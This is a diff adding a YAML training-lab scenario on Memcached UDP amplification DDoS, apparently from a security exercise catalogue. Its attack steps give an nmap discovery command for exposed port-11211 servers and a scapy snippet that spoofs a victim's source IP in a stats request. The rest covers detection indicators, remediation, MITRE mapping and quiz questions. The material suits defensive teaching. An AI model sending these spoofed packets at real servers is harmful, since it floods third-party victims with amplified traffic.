@@ -1,0 +1,92 @@
+# Category: DDoS & DoS
+name: "Memcached Amplification Attack – UDP Reflection"
+id: "ddos-memcached-amplification-001"
+category: "ddos"
+subcategory: "amplification"
+difficulty: "intermediate"
+estimated_time: "50 minutes"
+
+description: |
+  Exploit exposed Memcached servers (port 11211) to amplify DDoS traffic.
+  By sending a small UDP request with a spoofed victim IP, the attacker can
+  elicit a response many times larger (up to 10,000x amplification).
+
+learning_objectives:
+  - Understand Memcached UDP protocol
+  - Identify open Memcached servers
+  - Craft spoofed UDP packets with scapy
+  - Launch a test attack (authorized environment)
+
+tools:
+  - scapy
+  - nmap (for discovery)
+  - shodan (for finding exposed servers)
+
+prerequisites:
+  - Authorized test environment
+  - Memcached server with UDP enabled
+
+steps:
+  - id: "step1"
+    phase: "discovery"
+    action: "Find Memcached servers"
+    commands:
+      - "nmap -sU -p 11211 --script memcached-info <IP_RANGE>"
+    expected_output: "List of servers responding"
+    detection: "Nmap scan may be logged"
+
+  - id: "step2"
+    phase: "attack"
+    action: "Send spoofed request"
+    commands:
+      - "# Scapy script"
+      - "from scapy.all import *"
+      - "pkt = IP(src=target, dst=server)/UDP(sport=12345, dport=11211)/Raw(load=b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n')"
+      - "send(pkt)"
+    expected_output: "Large response sent to target"
+    detection: "Traffic spike; logs show UDP amplification"
+
+  - id: "step3"
+    phase: "impact"
+    action: "Monitor target bandwidth"
+    expected_output: "Bandwidth saturation"
+    detection: "DDoS alerts"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1498"
+    description: "Network Denial of Service"
+  - standard: "CIS Memcached Benchmarks"
+    control: "1.1"
+    description: "Disable UDP"
+
+detection:
+  network_indicators:
+    - "UDP traffic to port 11211 with spoofed source"
+  log_indicators:
+    - "Memcached logs may show stats requests"
+  endpoint_indicators:
+    - "scapy"
+
+remediation:
+  immediate:
+    - "Disable UDP on Memcached (bind to localhost only)"
+    - "Firewall port 11211"
+  long_term:
+    - "Upgrade Memcached to disable UDP"
+    - "Monitor for open Memcached servers"
+
+variables:
+  target_ip: "10.0.0.1"
+  memcached_server: "10.0.0.20"
+
+assessment_questions:
+  - "What is the amplification factor of Memcached UDP?"
+  - "How can you prevent Memcached from being used in amplification?"
+  - "What is the recommended mitigation for Memcached amplification?"
+
+references:
+  - url: "https://www.us-cert.gov/ncas/alerts/TA18-100A"
+    title: "Memcached DDoS"
+  - url: "https://github.com/randy1st/scapy"
+    title: "Scapy"
